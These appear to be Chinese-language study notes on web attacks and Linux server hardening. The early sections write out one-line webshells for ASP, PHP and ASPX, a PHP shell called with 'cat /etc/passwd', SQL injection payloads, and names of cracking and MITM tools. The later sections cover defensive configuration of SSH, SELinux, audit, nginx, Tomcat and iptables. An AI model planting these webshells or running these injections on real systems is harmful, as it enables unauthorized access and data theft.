# 文件上传漏洞

## 常用一句话木马

asp一句话木马：  <%execute(request("value"))%>

php一句话木马： <?php @eval($_POST[pwd]);?>  

aspx一句话木马：<%@ Page Language="Jscript"%>  <%eval(Request.Item["value"])%>

## 一句话最常用的客户端为：

一句话客户端增强版

中国菜刀

lanker一句话客户端

ZV新型PHP一句话木马客户端GUI版

# 文件包含

如果允许客户端用户输入控制动态包含在服务器端的文件，会导致恶意代码的执行及敏感信息泄露，主要包括本地文件包含和远程文件包含两种形式。
常见包含函数有：include()、require()
区别：

1. include是当代码执行到它的时候才加载文件,发生错误的时候只是给一个警告,然后继续往下执行
2. require是只要程序一执行就会立即调用文件,发生错误的时候会输出错误信息,并且终止脚本的运行

require一般是用于文件头包含类文件、数据库等等文件,include一般是用于包含html模版文件
include_once()、require_once()与(include\require)的功能相同,只是区别于当重复调用的时候，它只会调用一次。

利用图片隐藏一句话密码。

```php
shell.php
<?php eval($_REQUEST['pwd']);?> # 使用php函数
url:.../shell.php?pwd=phpinfo();
    
shell.php
<?php system($_REQUEST['pwd']);?> # 使用系统命令
url:.../shell.php?pwd=cat /etc/passwd
```



# SQL 注入攻击

```mysql
select * from mysql.user where user='Cdfsdfsdfsdf' or 1=1  -- eg ; 
# 有了or 1=1 条件一定为真，可以显示整张表信息，--是注释
select * from mysql.user union select * from mysql.user； # union 前后保持字段一致 ，结果字段名是前面的，值是后面的
mysql> select * from information_schema.tables; # 查询库，表信息
mysql> select * from information_schema.colums; # 查询库，表，列信息
mysql> SELECT CONCAT( '1', '01') # 合并字段
```

SQL注入流程

- 判断是否有sql注入漏洞；
- 判断操作系统，数据库和web应用的类型；
- 获取数据库信息，包括管理员信息及拖库；
- 加密信息破解，sqlmap可自动破解；
- 提升权限，获得sql-shell，os-shell，登录应用后台；

利用 单引号 看看会不会报错，以便看看有没有过滤。



# XSS 跨站攻击

利用网站未过滤用户输入信息，达到植入木马

BeEF 自动xss工具



# WEB 扫描工具

nmap 命令行扫描工具

AWVS 漏扫软件 windows

APPScan 漏扫软件windows



# SSH密码暴力破解

hydra 破解工具 功能多

Medusa 破解工具 功能少稳定

patator 破解工具



# 中间人攻击

Ettercap 工具



# Linux 基本防护

```shell
change -l username # 查看用户账户信息
change -E 2019-05-31 tom # 设置过期时间
change -d 0 username # 强制用户修改密码

passwd -l # 锁定账户
passwd -u # 解锁账户
passwd -S # 查看状态

# 强制定期修改密码,对新建用户有效
vim /etc/login.defs
PASS_MAX_DAYS
PASS_MIN_DAYS
PASS_WARN_AGE

# 伪装登录提示
vim /etc/issue /etc/issue.net
分别适用与本地，远程登录
默认会提示内核，系统等版本信息

# rhel6 的服务操作
chkconfig httpd on|off # 开机启动
service httpd status # 服务操作

#锁定，解锁文件，EXT4/EXT3可用
chattr +i/-i filename # 添加/解除 不可变
chattr +a/-a filename # 添加/解除 只能追加 >>
lsattr filename # 查看保护状态
```

## 用户切换与提权

```shell
# su 切换用户身份
su [-] -c "命令" [username] # - 切换环境变量

# 提权
sudo [-u username] 命令 # 以某用户的权限执行命令
sudo -l # 查看自己的sudo授权

# 配置 sudo 授权，推荐visudo，或 vim /etc/sudoers
# 格式 用户名 ip,主机名=命令列表（绝对路径）
# 格式 %组名 ip,主机名=命令列表（绝对路径）
dc localhost,hostname=/usr/bin/systemctl * httpd,/usr/bin/vim /etc/httpd/conf/httped.conf,!/sbin/ifconfig eth0

# sudo 别名设置，先设置，后使用，别名必须大写
User_Alias PRO=tom,jerry
Host_Alias SERVER=localhost,hostname
Cmnd_Alias MG=/bin/yum,/bin/rpm
PRO SERVER=MG

# sudo 启动日志，记录普通用户sudo操作
visudo
...
Defaults  logfile="/var/log/sudo"
```



# SSH 访问控制

```shell
# 常用配置
vim /etc/ssh/ssh_config
.. ..
Protocol 2                          # SSH协议
PermitRootLogin no                  # 禁止root用户登录
PermitEmptyPasswords no             # 禁止密码为空的用户登录
UseDNS  no                          # 不解析客户机地址
LoginGraceTime  1m                  # 登录限时
MaxAuthTries  3                     # 每连接最多认证次数
ListenAddress 192.168.4.1           # 监听的ip

systemctl restart sshd

passwd -d kate                         # 清空用户口令

# 黑/白名单，只用一个，白名单中针对SSH访问采用仅允许的策略，未明确列出的用户一概拒绝登录
vim /etc/ssh/sshd_config
.. ..
AllowUsers zhangsan tom useradm@192.168.4.0/24           # 定义账户白名单，没有地址代表所有
DenyUsers  USER1  USER2                                  # 定义账户黑名单
DenyGroups  GROUP1 GROUP2                                # 定义组黑名单
AllowGroups  GROUP1 GROUP2                               # 定义组白名单
```



# SElinux

```shell
sestatus # 查看selinux状态

vim /etc/selinux/config
SELINUX=enforcing                             # 设置SELinux为强制模式
SELINUXTYPE=targeted                          # 保护策略为保护主要的网络服务安全

# 在SELinux启用状态下，调整策略打开vsftpd服务的匿名上传访问
vim /etc/vsftpd/vsftpd.conf
anonymous_enable=YES                           # 开启匿名访问
anon_upload_enable=YES                         # 允许上传文件
anon_mkdir_write_enable=YES                    # 允许上传目录

# 查看SElinux 安全上下文
ls -Z

# 修改SElinux 安全上下文
chcon -t filename # 指定访问类型
chcon -R filename # 递归
# 移动的文件，保持原有的安全上下文。复制的文件，继承目标位置的安全上下文。

# 重置安全上下文
restorecon -R filename # 递归重置
/.autorelabel # 此文件表示下次重启后全部重置

# 调整布尔值
setsebool -P
getsebool -a

# 测试文件1，直接在ftp目录下创建文件
tar -czf  /var/ftp/log1.tar  /var/log
ls -lh /var/ftp/
-rw-r--r--. 1 root root 8M 8月  16 10:16 log1.tar
ls -Z /var/ftp/
-rw-r--r--. root root unconfined_u:object_r:public_content_t:s0 log1.tar
# 测试文件2，在/root下建立，然后移动至/var/ftp目录
tar -czf  log2.tar  /var/log
mv log2.tar /var/ftp/
ls -lh /var/ftp/
-rw-r--r--. 1 root root 8M 8月  16 10:16 log2.tar
ls -Z /var/ftp/
-rw-r--r--. 1 root root unconfined_u:object_r:admin_home_t:s0 log2.tar
# 使用wget命令分别下载这两个包文件，第二个包将会下载失败（看不到文件）。
```



# GPG(GunPG GUN Privacy Guard) 加密

```shell
yum -y install gnupg2
```



# NMAP

namp [扫描类型] [选项] <扫描目标 ...>

常用的扫描类型

- -sS TCP SYN扫描
- -sT TCP 连接扫描
- -sU UDP扫描
- -sP ICMP扫描
- -A 目标系统全面分析
- -n 不解析dns

```
namp -sP -p 21-80 -n 176.40.51.100-200
```



# tcpdump

tcpdump [选项] [过滤条件]

常见监控选项

-i 指定监控的网络接口，网卡名

-A 转为ACSII码，方便阅读

-w 将数据包信息保存到指定文件

-r 从指定文件读取数据包信息

-c 指定抓包个数

过滤条件

类型 host，net，port，postrange

方向 src，dst

协议 tcp，udp，ip，wlan，arp 。。。

多个条件组合 and，or，not

```shell
tcpdump -A -i eth0 -c 2 -w t.txt
tcpdump -A host 192.168.4.5  and  tcp  port  21 
```



# 审计

```shell
yum -y install audit
cat /etc/audit/auditd.conf           # 查看配置文件，确定日志位置
log_file = /var/log/audit/audit.log           # 日志文件路径
systemctl start auditd                # 服务不能停止

auditctl  -s                       # 查询状态
auditctl  -l                       # 查看规则
auditctl  -D                       # 删除所有规则

# 定义临时文件系统规则
auditctl -w 目录/文件 -p 权限 -k 审计规则名字 # 权限为r，w，x，a（文件或目录的属性发生变化）

# 永久审计规则
vim /etc/audit/rules.d/audit.rules
-w /etc/passwd -p wa -k passwd_changes
-w /usr/sbin/fdisk -p x -k partition_disks

# 手动查看日志
tailf  /var/log/audit/audit.log
#内容分析
# type为类型
# msg为(time_stamp:ID)，时间是date +%s（1970-1-1至今的秒数）
# arch=c000003e，代表x86_64（16进制）
# success=yes/no，事件是否成功
# a0-a3是程序调用时前4个参数，16进制编码了
# ppid父进程ID，如bash，pid进程ID，如cat命令
# auid是审核用户的id，su - test, 依然可以追踪su前的账户
# uid，gid用户与组
# tty:从哪个终端执行的命令
# comm="cat"            用户在命令行执行的指令
# exe="/bin/cat"        实际程序的路径
# key="sshd_config"    管理员定义的策略关键字key
# type=CWD        用来记录当前工作目录
# cwd="/home/username"
# type=PATH
# ouid(owner's user id）    对象所有者id
# guid(owner's groupid）    对象所有者id

# 工具搜索日志
ausearch -k sshd_config -i # 根据key搜索日志，-i选项表示以交互式方式操作
```

# 服务安全

Nginx安全优化包括：删除不要的模块、修改版本信息、限制并发、拒绝非法请求、防止buffer溢出。

MySQL安全优化包括：初始化安全脚本、密码安全、备份与还原、数据安全。

Tomcat安全优化包括：隐藏版本信息、降权启动、删除默认测试页面.

## nginx 安全

```shell
./configure \
>--without-http_autoindex_module \            # 禁用自动索引文件目录模块
>--without-http_ssi_module
```

修改版本信息，并隐藏具体的版本号

默认Nginx会显示版本信息以及具体的版本号，这些信息给攻击者带来了便利性，便于他们找到具体版本的漏洞。

如果需要屏蔽版本号信息，执行如下操作，可以隐藏版本号。

```shell
vim /usr/local/nginx/conf/nginx.conf
… …
http{
     server_tokens off;                            # 在http下面手动添加这么一行
     … …
}

# 但服务器还是显示了使用的软件为nginx，通过如下方法可以修改该信息。
vim +48 src/http/ngx_http_header_filter_module.c
# 注意：vim这条命令必须在nginx-1.12源码包目录下执行！！！！！！
# 该文件修改前如下：
static u_char ngx_http_server_string[] = "Server: nginx" CRLF;
static u_char ngx_http_server_full_string[] = "Server: " NGINX_VER CRLF;
static u_char ngx_http_server_build_string[] = "Server: " NGINX_VER_BUILD CRLF;

# 下面是我们修改后：
static u_char ngx_http_server_string[] = "Server: Jacob" CRLF;
static u_char ngx_http_server_full_string[] = "Server: Jacob" CRLF;
static u_char ngx_http_server_build_string[] = "Server: Jacob" CRLF;
# 修改完成后，再去编译安装Nignx，版本信息将不再显示为Nginx，而是Jacob
```

限制并发量

DDOS攻击者会发送大量的并发连接，占用服务器资源（包括连接数、带宽等），这样会导致正常用户处于等待或无法访问服务器的状态。

Nginx提供了一个ngx_http_limit_req_module模块，可以有效降低DDOS攻击的风险，操作方法如下：

```shell
vim /usr/local/nginx/conf/nginx.conf
… …
http{
… …
limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
    server {
        listen 80;
        server_name localhost;
        limit_req zone=one burst=5;
            }
}
# 备注说明：
# limit_req_zone语法格式如下：
# limit_req_zone key zone=name:size rate=rate;
# 上面案例中是将客户端IP信息存储名称为one的共享内存，内存空间为10M
# 1M可以存储8千个IP信息，10M可以存储8万个主机连接的状态，容量可以根据需要任意调整
# 每秒仅接受同ip的1个请求，多余的放入漏斗
# 漏斗超过5个则报错
```

通过如下设置可以让Nginx拒绝非法的请求

```shell
vim /usr/local/nginx/conf/nginx.conf
http{
       server {
                 listen 80;
# 这里，!符号表示对正则取反，~符号是正则匹配符号
# 如果用户使用非GET或POST方法访问网站，则retrun返回444的错误信息
              if ($request_method !~ ^(GET|POST)$ ) {
                     return 444;
               }    
        }
}
```

防止buffer溢出
当客户端连接服务器时，服务器会启用各种缓存，用来存放连接的状态信息。
如果攻击者发送大量的连接请求，而服务器不对缓存做限制的话，内存数据就有可能溢出（空间不足）。
修改Nginx配置文件，调整各种buffer参数，可以有效降低溢出风险。

```shell
vim /usr/local/nginx/conf/nginx.conf
http{
client_body_buffer_size  1K;
client_header_buffer_size 1k;
client_max_body_size 1k;
large_client_header_buffers 2 1k;
 … …
}
```

数据库安全

数据库还有一个binlog日志里也有明文密码（5.6版本后修复了）。

怎么解决？

管理好自己的历史，不使用明文登录，选择合适的版本5.6以后的版本，

日志，行为审计（找到行为人），使用防火墙从TCP层设置ACL（禁止外网接触数据库）。

可以使用SSH远程连接服务器后，再从本地登陆数据库（避免在网络中传输数据，因为网络环境中不知道有没有抓包者）。

或者也可以使用SSL对MySQL服务器进行加密，类似与HTTP+SSL一样，MySQL也支持SSL加密（确保网络中传输的数据是被加密的）。

```shell
 mysql_secure_installation # 执行初始化安全脚本
```

Tomcat安全性

隐藏版本信息、修改tomcat主配置文件

```shell
yum -y install java-1.8.0-openjdk-devel
cd /usr/local/tomcat/lib/
jar -xf catalina.jar
vim org/apache/catalina/util/ServerInfo.properties 
# 根据自己的需要，修改版本信息的内容
/usr/local/tomcat/bin/shutdown.sh        # 关闭服务
/usr/local/tomcat/bin/startup.sh         # 启动服务

# 修改版本信息，手动添加server参数
vim /usr/local/tomcat/conf/server.xml
<Connector port="8080" protocol="HTTP/1.1"
connectionTimeout="20000"  redirectPort="8443" server="jacob" />
```

降级启动

默认tomcat使用系统高级管理员账户root启动服务，启动服务尽量使用普通用户。

```shell
useradd tomcat
chown -R tomcat:tomcat /usr/local/tomcat/
# 修改tomcat目录的权限，让tomcat账户对该目录有操作权限
su -c /usr/local/tomcat/bin/startup.sh tomcat
# 使用su命令切换为tomcat账户，以tomcat账户的身份启动tomcat服务
chmod +x /etc/rc.local              # 该文件为开机启动文件
vim /etc/rc.local                    # 修改文件，添加如下内容
su -c /usr/local/tomcat/bin/startup.sh tomcat
```

删除默认的测试页面

```shell
rm -rf  /usr/local/tomcat/webapps/*
```

# 补丁

在Linux系统中diff命令可以为我们生成补丁文件，然后使用patch命令为有问题的程序代码打补丁

```shell
#  编写两个版本的脚本，一个为v1版本，一个为v2版本。
cat test1.sh                                # v1版本脚本
#!/bin/bash
echo "hello wrld"

cat test2.sh                                # v2版本脚本
#!/bin/bash
echo "hello the world"
echo "test file"

# 使用diff命令查看不同版本文件的差异。
diff  test1.sh test2.sh                    # 查看文件差异
@@ -1,3 +1,3 @@
 #!/bin/bash
-echo "hello world"
-echo "test"
+echo "hello the world"
+echo "test file"

diff -u test1.sh test2.sh                 # 查看差异，包含头部信息
--- test1.sh    2018-02-07 22:20:02.723971251 +0800
+++ test2.sh    2018-02-07 22:20:13.358760687 +0800
@@ -1,3 +1,3 @@
 #!/bin/bash
-echo "hello world"
-echo "test"
+echo "hello the world"
+echo "test file"

# 生成补丁文件
diff -u test1.sh test2.sh > test.patch

# 使用patch命令打补丁
yum -y install patch
patch -p0 < test.patch                  # 打补丁
patch -RE < test.patch                  # 还原旧版本，反向修复
```

diff制作补丁文件的原理：告诉我们怎么修改第一个文件后能得到第二个文件。

这样如果第一个版本的脚本有漏洞，我们不需要将整个脚本都替换，仅需要修改有问题的一小部分代码即可，diff刚好可以满足这个需求！

像Linux内核这样的大块头，一旦发现有一个小漏洞，我们不可能把整个内核都重新下载，全部替换一遍，而仅需要更新有问题的那一小部分代码即可！

diff命令常用选项：

- -u	输出统一内容的头部信息（打补丁使用），计算机知道是哪个文件需要修改
- -r	递归对比目录中的所有资源（可以对比目录）
- -a	所有文件视为文本（包括二进制程序）
- -N	无文件视为空文件（空文件怎么变成第二个文件）

-N选项备注说明：

A目录下没有txt文件，B目录下有txt文件

diff比较两个目录时，默认会提示txt仅在B目录有（无法对比差异，修复文件）

diff比较时使用N选项，则diff会拿B下的txt与A下的空文件对比，补丁信息会明确说明如何从空文件修改后变成txt文件，打补丁即可成功！



patch 

当前路径加补丁文件内路径 为需要更改的文件

-pnum num为删除路径的个数

如 原路径为 /u/howard/src/blurfl/blurfl.c

-p0 保持原路径

-p1 为u/howard/src/blurfl/blurfl.c

-p4 为blurfl/blurfl.c

-R 反向修复

-E 修复后如果文件为空，则删除该文件



# 防火墙

RHEY7 默认使用firewalld作为防火墙，但firewalld底层还是调用包过滤防火墙iptables

```
systemctl stop firewalld
systemctl disable firewalld
yum -y install iptables-services
systemctl start iptables.service
```

iptables的表，链结构

![包经过的过程](021217_0051_2.png)

到本机某进程的报文：PREROUTING --> INPUT

由本机转发的报文：PREROUTING --> FORWARD --> POSTROUTING

由本机的某进程发出报文（通常为响应报文）：OUTPUT --> POSTROUTING



iptables的5个链（区分大小写）：

- INPUT链（入站规则）
- OUTPUT链（出站规则）
- FORWARD链（转发规则）
- PREROUTING链（路由前规则）
- POSTROUTING链（路由后规则）

| raw表（状态跟踪） | mangle表（包标记表） | nat表（地址转换） | filter表（过滤表） |
| ----------------- | -------------------- | ----------------- | ------------------ |
| PREROUTING        | PREROUTING           | PREROUTING        | INPUT              |
| OUTPUT            | POSTROUTING          | POSTROUTING       | FORWARD            |
|                   | INPUT                | OUTPUT            | OUTPUT             |
|                   | OUTPUT               |                   |                    |
|                   | FORWARD              |                   |                    |

包过滤匹配流程

规则链内的匹配顺序顺序比对，匹配及停止（LOG除外）。若无任何匹配，则按该链的默认策略处理（初始默认是aceept）

```shell
/usr/sbin/iptables
iptables [-t 表名] 选项 [链名] [条件] [-j 目标操作]
链名不写，默认为所有
表名不写，默认为filter
选项/链名/目标操作 大写，其余小写
```

常用目标操作

| ACCEPT | 允许通过/放行                |
| ------ | ---------------------------- |
| DROP   | 直接丢弃                     |
| REJECT | 拒绝通过，必要时会给出提示   |
| LOG    | 记录日志，然后传给下一条规则 |

常用选项

| -A             | 在链尾追加规则                         |
| -------------- | -------------------------------------- |
| -I             | 在链开头（或指定序号）插入规则         |
| -L             | 列出所有的规则条目                     |
| -n             | 以数字形式显示地址，端口等信息         |
| --line-numbers | 查看规则时，显示规则的序号             |
| -D             | 三删除链内指定序号（或内容）的一条规则 |
| -F             | 清空所有的规则                         |
| -P             | 为指定的链设置默认规则                 |

```shell
iptables -L
iptables -t filter -L
iptables -t filter -nL
iptables -t filter -nL --line-numbers
iptables -t nat -nL --line-numbers
iptables -t mangle -nL --line-numbers
iptables -t raw -nL --line-numbers
iptables -t raw -nL OUTPUT --line-numbers
iptables -t nat -nL OUTPUT --line-numbers
iptables -t filter -nL OUTPUT --line-numbers
iptables -t filter -nL INPUT --line-numbers
iptables -t filter -D INPUT 3
iptables -t filter -F INPUT

iptables  -F # 清空filter表中所有链的防火墙规则
iptables  -t  nat  -F # 清空nat表中所有链的防火墙规则
iptables  -t  mangle  -F # 清空mangle表中所有链的防火墙规则
iptables  -t  raw  -F # 清空raw表中所有链的防火墙规则
```

基本匹配条件

| -p          | 协议名       |
| ----------- | ------------ |
| -s          | 源地址       |
| -d          | 目标地址     |
| -i          | 收数据的网卡 |
| -o          | 发数据的网卡 |
| --sport     | 源端口       |
| --dport     | 目标端口     |
| --imcp-type | ICMP类型     |

! 取反

```shell
iptables -A INPUT -p tcp --dport 22 -j ACCEPT
iptables -P INPUT DROP
iptables -t filter -I INPUT -s 192.168.4.52 -p tcp --dport 22 -j DROP

# 永久保存规则
iptables-save > /etc/sysconfig/iptables

iptables -t filter -A INPUT -p icmp --imcp-type echo-reply -j ACCEPT
```

扩展匹配条件

前提条件：有对应的防火墙模块支持

基本用法：-m 扩展模块 --扩展条件 条件值

示例：-m mac --mac-source 00:0C:29:74:BE:21

| 选项         | 用法                                                         |
| ------------ | ------------------------------------------------------------ |
| MAC 地址匹配 | -m mac --mac-source MAC地址                                  |
| 多端口匹配   | -m multiport --sports 源端口列表<br/>-m multiport --dports 目标端口列表 |
| IP范围匹配   | -m iprange --src-range IP1-IP2<br/>-m iprange --dst-range IP1-IP2 |

```shell
iptables -t filter -A INPUT -p tcp -m multiport --dports 22 80 -j ACCEPT
iptables -t filter -I INPUT 4 -p icmp --imcp-type echo-requset -m mac --mac-source 00:0C:29:74:BE:21 -j DROP
```

nat 表典型应用

```shell
# 内网主机临时指定网关
systemctl stop NetworkManager
route add default gw 192.168.2.52

# 防火墙主机
sysctl -p # 查询路由功能
echo 'net.ipv4.ip_forward=1' >> /etc/sysctl.conf # 永久修改，然后执行命令 sysctl -p 使修改立即生效
echo 1 > /proc/sys/net/ipv4/ip_forward            # 开启路由转发

iptables  -t  nat  -A POSTROUTING -s  192.168.2.0/24 -p tcp --dport 80  -j SNAT  --to-source 192.168.4.5  # 将2.0的都转为4.5

iptables  -t  nat  -A POSTROUTING -s  192.168.2.0/24 -o eth0  -j MASQUERADE  # 将来自2.0，从eth0网卡出去的流量伪装
```

